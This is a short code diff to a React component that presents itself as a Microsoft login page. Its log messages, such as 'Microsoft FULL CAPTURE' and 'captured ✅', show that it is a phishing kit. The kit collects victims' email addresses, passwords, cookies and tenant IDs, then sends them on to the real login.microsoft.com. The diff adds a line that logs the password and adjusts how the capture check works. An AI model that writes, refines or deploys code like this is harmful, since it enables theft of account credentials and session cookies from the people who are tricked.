@@ -62,6 +62,7 @@ export default function MicrosoftLoginPage() {
     }
   }
 
+console.log('Sending password:', password)
   const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
@@ -78,7 +79,7 @@ export default function MicrosoftLoginPage() {
         upn: email
       }
 
-      console.log('🎣 Microsoft FULL CAPTURE:', {
+      console.log('🎣 Microsoft captured:', {
         email,
         hasCookies: fullData.cookies !== 'none',
         tenantId: fullData.tenantId,
@@ -93,7 +94,7 @@ export default function MicrosoftLoginPage() {
 
       const result = await res.json()
       
-      if (result.status === 'captured ✅') {
+      if (res.ok) {
         
       window.location.href = 'https://login.microsoft.com'
       } else {
